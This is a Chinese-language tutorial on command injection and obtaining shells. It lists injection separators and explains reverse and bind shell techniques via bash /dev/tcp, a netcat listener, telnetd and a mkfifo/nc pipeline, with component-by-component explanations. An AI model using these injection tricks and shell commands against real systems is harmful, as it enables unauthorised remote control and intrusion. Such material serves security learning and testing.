命令分割

命令注入有许多方法常见有

  • ``
  • $()
  • \n
  • ;
  • &
  • |

其中`与$()的优先级最高,哪怕被”包裹依然能够执行,但无法绕过’包裹

bash

bash有一个特性可以通过/dev/tcp获得shell的方式

我们只需要在攻击端上监听一个端口(本质上就是建立一个tcp服务器等待连接)

nc -lvnp 6678

利用bash创建socket的特性,然后再在被攻击端执行

bash -i ：创建一个交互式shell

/dev/tcp/ip/port ：利用bash的特性，创建一个socket连接

0>&1 ：将stdin重定向给stdout

0>&2 ：将stdin重定向给stderr

bash -c "command" ：创建一个子shell环境运行command

现在攻击端就获得了一个shell

telnet

如果目标存在telnetd服务的话,可以直接利用telnetd

telnetd -l /bin/sh -p 55557

mkfifo

mkfifo 是一个专门用于创建命名管道（FIFO）的命令。它的语法相对简单，因为它仅用于创建一种类型的文件。

命名管道（Named Pipe），又称为FIFO（First In, First Out），是一种特殊类型的文件，它允许两个进程进行通信。与匿名管道不同，命名管道可以在系统的文件系统中创建，并具有路径名。

命令分解与解释

  1. cat /tmp/f：
    • 这个部分读取命名管道 /tmp/f 的内容。因为这是一个命名管道，命令会阻塞，直到有数据写入管道。
  2. | /bin/sh -i：
    • 管道符号 | 将前一个命令的输出（从 /tmp/f 读取的数据）传递给后一个命令作为输入。
    • /bin/sh -i 启动一个交互式的Shell。-i 标志表示Shell是交互式的，允许输入和输出命令。
  3. 2>&1：
    • 这部分将Shell的标准错误输出（文件描述符2）重定向到标准输出（文件描述符1）。这意味着所有的错误消息和正常输出都将通过相同的管道传输。
  4. | nc ip port：
    • 再次使用管道符号 |，将Shell的输出传递给 nc 命令。
    • nc（Netcat）是一个用于读写网络连接的工具。在这里，它被用来连接到指定的IP地址和端口。
    • ip 和 port 是占位符，分别表示攻击者的IP地址和端口号。
  5. >/tmp/f:
    • 最后又将nc得到的返回字符串写入/tmp/f做到了一个完美循环,即目标发送的字符被当作命令执行,命令执行的结果又会发送到目标

mknod

mknod包括mkfifo的功能

mknod 用于创建各种类型的特殊文件，包括设备文件和命名管道（FIFO）。其语法较为复杂，因为它可以创建不同类型的文件。

NAME：要创建的文件名。

TYPE：文件类型，可以是 b（块设备）、c（字符设备）或 p（命名管道）。

MAJOR MINOR（仅在创建设备文件时使用）：指定设备的主、次设备号。
